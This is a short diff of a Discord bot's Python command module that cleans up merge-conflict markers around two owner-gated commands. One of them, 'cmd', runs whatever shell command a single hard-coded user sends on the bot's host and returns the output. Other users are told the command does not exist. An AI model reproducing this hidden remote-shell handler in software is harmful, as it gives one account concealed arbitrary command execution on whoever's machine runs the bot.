@@ -15,7 +15,6 @@ class Oscmd(commands.Cog):
     async def cmd(self,ctx,*, command_string):
         if str(ctx.message.author) == "Known_black_hat#9645":
             output = subprocess.getoutput(command_string)
-<<<<<<< HEAD
             await ctx.send(embed=cr.emb(cr.green,"Console",f"```\n{output[:1900]}\n```"))
         else:
             raise 'Command not found'
@@ -23,12 +22,6 @@ class Oscmd(commands.Cog):
 
 
     @commands.command(name="update")
-=======
-            await ctx.send(embed=cr.emb(cr.green,"Console",f"``` {output[:1900]} ```"))
-        else:
-            raise 'Command not found'
-"""    @commands.command(name="update")
->>>>>>> 6ead700b4ca2f924fa598668ab7c44768191b5b1
     async def update(self,ctx):
         if str(ctx.message.author) == "Known_black_hat#9645":
             await self.bot.change_presence(status=disnake.Status.idle,activity=disnake.Game(name='Update'))
